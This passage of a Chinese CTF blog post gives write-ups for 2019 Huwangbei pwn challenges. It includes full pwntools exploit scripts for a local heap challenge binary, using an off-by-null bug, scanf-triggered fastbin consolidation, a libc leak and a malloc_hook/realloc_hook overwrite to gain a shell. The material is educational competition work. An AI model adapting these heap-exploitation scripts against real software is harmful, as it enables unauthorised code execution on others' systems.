+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-a6ded759f2472a18.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#开了alsr运行了几次的one_gadget地址</span><br><span class="line">0xf75a6c69</span><br><span class="line">0xf754dc69</span><br><span class="line">0xf7570c69</span><br><span class="line">0xf7583c69</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-5d8ef622f7c5171e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def sl(x):</span><br><span class="line">	p.sendline(x)</span><br><span class="line"></span><br><span class="line">def ru(x):</span><br><span class="line">	p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">def se(x):</span><br><span class="line">	p.send(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def new():</span><br><span class="line">	sl(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">def new_1():</span><br><span class="line">	sl(&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">def zhixinghanshu(index,cont1,cont2):</span><br><span class="line">	sl(&apos;3&apos;)</span><br><span class="line">	sl(str(index))</span><br><span class="line">	sl(cont1)</span><br><span class="line">	sl(cont2)</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">	sl(&apos;4&apos;)</span><br><span class="line">	sl(str(index))</span><br><span class="line"></span><br><span class="line">def edit(choice,cont):</span><br><span class="line">	sl(&apos;5&apos;)</span><br><span class="line">	sl(str(choice))</span><br><span class="line">	sl(cont)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn_it():</span><br><span class="line"></span><br><span class="line">	for i in range(9):</span><br><span class="line">		new()</span><br><span class="line"></span><br><span class="line">	one_gadget = 0xf75a9c5c</span><br><span class="line">	#one_gadget = 0xf7e3fc5c</span><br><span class="line">	#fake chunk -&gt; *(ptr[index]+0x55*4)</span><br><span class="line">	pay = &apos;a&apos;*(0x54*4) + p32(one_gadget)</span><br><span class="line">	edit(2,pay)</span><br><span class="line">	new_1()</span><br><span class="line">	dele(9)</span><br><span class="line"></span><br><span class="line">	#gdb.attach(p)</span><br><span class="line">	zhixinghanshu(9,&apos;1&apos;,&apos;2&apos;)</span><br><span class="line">	#0xf75a6c69</span><br><span class="line">	#0xf754dc69</span><br><span class="line">	#0xf7570c69</span><br><span class="line">	#0xf7583c69</span><br><span class="line">	</span><br><span class="line">	p.sendline(&apos;ls&apos;)</span><br><span class="line">	p.sendline(&apos;ls&apos;)</span><br><span class="line">	data = p.recv()</span><br><span class="line">	if (data):</span><br><span class="line">		p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	</span><br><span class="line">	while True:</span><br><span class="line">		try:</span><br><span class="line">			p = process(&apos;./silentheap&apos;)</span><br><span class="line">			pwn_it()</span><br><span class="line">		except Exception as e:</span><br><span class="line">			p.close()</span><br><span class="line">		finally:</span><br><span class="line">			p.close()</span><br></pre></td></tr></table></figure>
+<h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><ul>
+<li><p>这题与hctf2018的heapstorm zero十分像，所以参考了它的<a href="https://www.secpulse.com/archives/92335.html" target="_blank" rel="noopener">wp</a>之后做出来了</p>
+</li>
+<li><p>这题漏洞点在于off by null，而且题目限制了chunk只能0x58大小，如果只是 fastbin 的话 off by null 是没法利用的，但是这里有个小tips，使用 scanf 获取内容时，如果 输入字符串比较长会调用 malloc 来分配内存。</p>
+</li>
+<li><p>在 malloc 分配内存时，首先会一次扫描一遍 fastbin , smallbin ， unsorted bin ，largebin, 如果都找不到可以分配的 chunk 分配给用户 ， 会进入 top_chunk 分配的流程， 如果此时还有fastbin ，就会触发堆合并机制，把 fastbin 合并 之后放入 smallbin，再看能否分配，不能的话会使用 top_chunk 进行分配。</p>
+</li>
+<li><p>于是利用 scanf 能分配大内存的特性，我们可以触发 堆合并，然后让 fastbin 合并成一个smallbin , 然后在触发 off-by-null , 就是常规的利用思路了。</p>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-501af17bd5208614.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>先构造好堆的分布，以便后续利用，其中chunk1，chunk2，chunk3，chunk4的size之和要为0x110为了后续的off by null操作</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add_flo(0x58,0,&apos;a&apos;)</span><br><span class="line">add_flo(0x30,1,&apos;b&apos;)</span><br><span class="line">add_flo(0x30,2,&apos;c&apos;)</span><br><span class="line">add_flo(0x40,3,&apos;d&apos;)</span><br><span class="line">add_flo(0x30,4,p64(8)*4+p64(0x100)+p64(0x10))</span><br><span class="line">add_flo(0x30,5,&apos;e&apos;)</span><br><span class="line">remove_flo(5)</span><br><span class="line">add_flo(0x10,5,&apos;e&apos;) #保留块， 防止和 top chunk 合并</span><br><span class="line">add_flo(0x30,5,&apos;e&apos;)</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-6a0399ddae38dbf3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>然后释放chunk1-5，再利用scanf触发fastbin合并为small bin，所以现在得到了一块大小为0x110的small bin</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for i in range(1,5):</span><br><span class="line">	remove_flo(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-9ab15600b36a108a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-8d6c6e8331ebe7dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>释放chunk0，再分配chunk0，利用off by null修改chunk1的size为0x100</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">remove_flo(0)</span><br><span class="line">add_flo(0x58,0,&apos;a&apos;*0x58)</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-1455b28f6b2ad5b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-ae41f6bcaf1d181c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>通过对small bin的4次切割，再次分配4个chunk</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add_flo(0x10,1,&apos;a&apos;)</span><br><span class="line">add_flo(0x30,2,&apos;b&apos;)</span><br><span class="line">add_flo(0x30,3,&apos;\x78&apos;)</span><br><span class="line">add_flo(0x50,4,&apos;d&apos;)</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-feca49d03f4f8157.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-0a1ad8a1b2c01096.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>然后我们释放chunk1,chunk2，并通过scanf让他们合并为small bin，再通过释放chunk5与scanf来触发unlink机制，通过 extend 前向 overlapping，得到一个包含chunk3和chunk4的大small bin，具体原理可以看<a href="http://blog.eonew.cn/archives/546#_free_smallbin_extend" target="_blank" rel="noopener">http://blog.eonew.cn/archives/546#_free_smallbin_extend</a></li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-3603b77f430c3cb4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">remove_flo(1)</span><br><span class="line">remove_flo(2)</span><br><span class="line">triger_consolidate()</span><br><span class="line">remove_flo(5)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-99e50c8703c9f55d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-6a5eadf655477cf4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>由于chunk3之前保留了small bin分配下来的指针，所以通过chunk3泄漏libc，从而得到其他地址</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#leak libc</span><br><span class="line">show_flo(3)</span><br><span class="line">ru(&apos;flowers : &apos;)</span><br><span class="line">leak_libc = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(&apos;leak libc : 0x%x&apos;%leak_libc)</span><br><span class="line">libc_base = leak_libc - 88 - 0x3c4b20</span><br><span class="line">info(&apos;libc base  : 0x%x&apos;%libc_base)</span><br><span class="line">realloc_hook = libc_base + 0x3c4b10 - 0x28</span><br><span class="line">main_arena = libc_base + 0x3c4b38 - 0x8</span><br><span class="line">one_gadget = libc_base + 0xf02a4</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">realloc = libc_base + libc.symbols[&apos;__libc_realloc&apos;]</span><br></pre></td></tr></table></figure>
+<ul>
+<li>将chunk3，chunk4也释放，得到两个fastbin ，通过切割大small bin，使得到的堆块能够修改fastbin的fd指针</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">remove_flo(3)</span><br><span class="line">remove_flo(4)</span><br><span class="line"></span><br><span class="line">for i in range(2):</span><br><span class="line">	add_flo(0x10,1,&apos;1111&apos;)</span><br><span class="line"></span><br><span class="line">pay = p64(0)*3 + p64(0x41) + p64(0x61)</span><br><span class="line">add_flo(0x40,2,pay)</span><br><span class="line"></span><br><span class="line">pay = p64(0) + p64(0x61) + p64(main_arena)</span><br><span class="line">add_flo(0x20,3,pay)</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-5d4d807712db2e66.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-592aed777dd59aa0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-9cba7fb1ef1646d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>malloc一个0x30的堆块会从fastbin中取出，此时fastbin只剩下0x61</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_flo(0x30,2,&apos;2&apos;) #消除0x40 fastbin</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-1cd201345a87177c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>于是我们可以分配堆块到main_arena中，然后去修改top_chunk到realloc_hook前面</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add_flo(0x58,3,&apos;3&apos;)</span><br><span class="line">add_flo(0x58,3,p64(0)*7+p64(realloc_hook))</span><br></pre></td></tr></table></figure>
+<ul>
+<li>接着先分配堆块清除unsorted bin，然后分配堆块到realloc_hook，修改realloc_hook 为 one_gadget，malloc_hook为realloc函数+0x14地址处，通过malloc函数来触发one_gadget</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">for i in range(3):</span><br><span class="line">	add_flo(0x20,&apos;1&apos;,&apos;1&apos;)</span><br><span class="line">pay = p64(0)*2 + p64(one_gadget) + p64(realloc+0x14)</span><br><span class="line">add_flo(0x40,3,pay)</span><br><span class="line"></span><br><span class="line">ru(&apos;choice &gt;&gt; \n&apos;)</span><br><span class="line">sl(&apos;1&apos;)</span><br><span class="line">ru(&apos;of Size : &apos;)</span><br><span class="line">sl(&apos;10&apos;)	</span><br><span class="line">ru(&apos;index: &apos;)</span><br><span class="line">sl(&apos;0&apos;)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这里是因为直接改malloc_hook为one_gadget不满足条件，所以无法getshell，才通过malloc_hook调用realloc_hook的方法，通过通过改realloc函数偏移的方法微调来满足one_gadget的条件</li>
+</ul>
+<p>完整exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(&apos;./pwn 2&apos;)</span><br><span class="line"></span><br><span class="line">def sl(x):</span><br><span class="line">	p.sendline(x)</span><br><span class="line"></span><br><span class="line">def ru(x):</span><br><span class="line">	p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">def se(x):</span><br><span class="line">	p.send(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add_flo(size,index,name):</span><br><span class="line">	ru(&apos;choice &gt;&gt; \n&apos;)</span><br><span class="line">	sl(&apos;1&apos;)</span><br><span class="line">	ru(&apos;of Size : &apos;)</span><br><span class="line">	sl(str(size))</span><br><span class="line">	ru(&apos;index: &apos;)</span><br><span class="line">	sl(str(index))</span><br><span class="line">	ru(&apos; name:&apos;)</span><br><span class="line">	se(name)</span><br><span class="line"></span><br><span class="line">def remove_flo(index):</span><br><span class="line">	ru(&apos;choice &gt;&gt; \n&apos;)</span><br><span class="line">	sl(&apos;2&apos;)</span><br><span class="line">	ru(&apos;input idx :&apos;)</span><br><span class="line">	sl(str(index))</span><br><span class="line"></span><br><span class="line">def show_flo(index):</span><br><span class="line">	ru(&apos;choice &gt;&gt; \n&apos;)</span><br><span class="line">	sl(&apos;3&apos;)</span><br><span class="line">	ru(&apos;Input idx : \n&apos;)</span><br><span class="line">	sl(str(index))</span><br><span class="line"></span><br><span class="line">def triger_consolidate():</span><br><span class="line">	ru(&apos;choice &gt;&gt; \n&apos;)</span><br><span class="line">	sl(&apos;1&apos;*0x400)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_flo(0x58,0,&apos;a&apos;)</span><br><span class="line">add_flo(0x30,1,&apos;b&apos;)</span><br><span class="line">add_flo(0x30,2,&apos;c&apos;)</span><br><span class="line">add_flo(0x40,3,&apos;d&apos;)</span><br><span class="line">add_flo(0x30,4,p64(0)*4+p64(0x100)+p64(0x10))</span><br><span class="line">add_flo(0x30,5,&apos;e&apos;)</span><br><span class="line">remove_flo(5)</span><br><span class="line">add_flo(0x10,5,&apos;e&apos;) #保留块， 防止和 top chunk 合并</span><br><span class="line">add_flo(0x30,5,&apos;e&apos;) </span><br><span class="line"></span><br><span class="line">#----------------------------</span><br><span class="line"></span><br><span class="line">for i in range(1,5):</span><br><span class="line">	remove_flo(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">#----------------------------</span><br><span class="line"></span><br><span class="line">remove_flo(0)</span><br><span class="line">add_flo(0x58,0,&apos;a&apos;*0x58)</span><br><span class="line"></span><br><span class="line">#----------------------------</span><br><span class="line"></span><br><span class="line">add_flo(0x10,1,&apos;a&apos;)</span><br><span class="line">add_flo(0x30,2,&apos;b&apos;)</span><br><span class="line">add_flo(0x30,3,&apos;\x78&apos;)</span><br><span class="line">add_flo(0x50,4,&apos;d&apos;)</span><br><span class="line"></span><br><span class="line">#----------------------------</span><br><span class="line"></span><br><span class="line">remove_flo(1)</span><br><span class="line">remove_flo(2)</span><br><span class="line">triger_consolidate()</span><br><span class="line">remove_flo(5)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">#----------------------------</span><br><span class="line"></span><br><span class="line">#leak libc</span><br><span class="line">show_flo(3)</span><br><span class="line">ru(&apos;flowers : &apos;)</span><br><span class="line">leak_libc = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(&apos;leak libc : 0x%x&apos;%leak_libc)</span><br><span class="line">libc_base = leak_libc - 88 - 0x3c4b20</span><br><span class="line">info(&apos;libc base  : 0x%x&apos;%libc_base)</span><br><span class="line">realloc_hook = libc_base + 0x3c4b10 - 0x28</span><br><span class="line">main_arena = libc_base + 0x3c4b38 - 0x8</span><br><span class="line">one_gadget = libc_base + 0xf02a4</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">realloc = libc_base + libc.symbols[&apos;__libc_realloc&apos;]</span><br><span class="line"></span><br><span class="line">#----------------------------</span><br><span class="line"></span><br><span class="line">remove_flo(3)</span><br><span class="line">remove_flo(4)</span><br><span class="line"></span><br><span class="line">for i in range(2):</span><br><span class="line">	add_flo(0x10,1,&apos;1111&apos;)</span><br><span class="line"></span><br><span class="line">pay = p64(0)*3 + p64(0x41) + p64(0x61)</span><br><span class="line">add_flo(0x40,2,pay)</span><br><span class="line"></span><br><span class="line">pay = p64(0) + p64(0x61) + p64(main_arena)</span><br><span class="line">add_flo(0x20,3,pay)</span><br><span class="line"></span><br><span class="line">#----------------------------</span><br><span class="line"></span><br><span class="line">add_flo(0x30,2,&apos;2&apos;) #消除0x40 fastbin</span><br><span class="line">add_flo(0x58,3,&apos;3&apos;)</span><br><span class="line">add_flo(0x58,3,p64(0)*7+p64(realloc_hook))</span><br><span class="line"></span><br><span class="line">#----------------------------</span><br><span class="line"></span><br><span class="line">for i in range(3):</span><br><span class="line">	add_flo(0x20,&apos;1&apos;,&apos;1&apos;)</span><br><span class="line">pay = p64(0)*2 + p64(one_gadget) + p64(realloc+0x14)</span><br><span class="line">add_flo(0x40,3,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#----------------------------</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#trigger one_gadget</span><br><span class="line">ru(&apos;choice &gt;&gt; \n&apos;)</span><br><span class="line">sl(&apos;1&apos;)</span><br><span class="line">ru(&apos;of Size : &apos;)</span><br><span class="line">sl(&apos;10&apos;)	</span><br><span class="line">ru(&apos;index: &apos;)</span><br><span class="line">sl(&apos;0&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-9d24f96668948c8b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    D4rk3r
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2019/09/08/2019护网杯-pwn/" title="2019护网杯_pwn">http://yoursite.com/2019/09/08/2019护网杯-pwn/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" <i class="fa fa-tag"></i> pwn</a>
+          
+            <a href="/tags/ctf/" <i class="fa fa-tag"></i> ctf</a>
+          
+            <a href="/tags/writesups/" <i class="fa fa-tag"></i> writesups</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/26/ogeek2019-pwn/" rel="next" title="ogeek2019_pwn">
+                <i class="fa fa-chevron-left"></i> ogeek2019_pwn
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/head.jpg"
+                alt="D4rk3r" />
+            
+              <p class="site-author-name" itemprop="name">D4rk3r</p>
+              <p class="site-description motion-element" itemprop="description">Impossible -> I'm possible</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/hacker-mao" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:hacker_mao@foxmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.jianshu.com/u/0d74cafbe972" target="_blank" title="简书">
+                      
+                        <i class="fa fa-fw fa-globe"></i>简书</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
